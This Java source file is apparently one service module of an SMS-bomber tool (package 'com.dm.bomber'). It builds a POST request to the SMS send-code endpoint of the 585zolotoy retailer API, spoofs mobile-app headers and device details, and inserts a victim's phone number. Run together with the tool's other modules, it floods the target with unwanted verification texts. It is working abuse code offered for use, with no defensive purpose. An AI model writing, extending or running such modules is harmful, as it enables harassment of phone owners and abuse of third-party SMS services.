package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class Zoloto585 extends JsonService {

    public Zoloto585() {
        setUrl("https://api.585zolotoy.ru/api/sms/send_code/");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("x-qa-client-type", "MOBILE");
        builder.addHeader("x-qa-company", "3e6efe10-defd-4983-94a1-c5a4d3cb3689");
        builder.addHeader("x-qa-region", "bfa985a6-a41f-42cd-ac06-53e7267123e4");
        builder.addHeader("x-qa-os-version", "30");
        builder.addHeader("x-qa-device-model", "Aboba");
        builder.addHeader("x-qa-device-brand", "Redmi");
        builder.addHeader("x-qa-device-manufacturer", "Xiaomi");
        builder.addHeader("x-qa-platform", "android");
        builder.addHeader("x-qa-app-version", "1.1.0.4");
        builder.addHeader("x-qa-app-version-code", "1331");
        builder.addHeader("x-qa-client-id", "3ac5e3bc-3553-4e3c-8cf4-982aa7721b33");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("phone", getFormattedPhone());
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
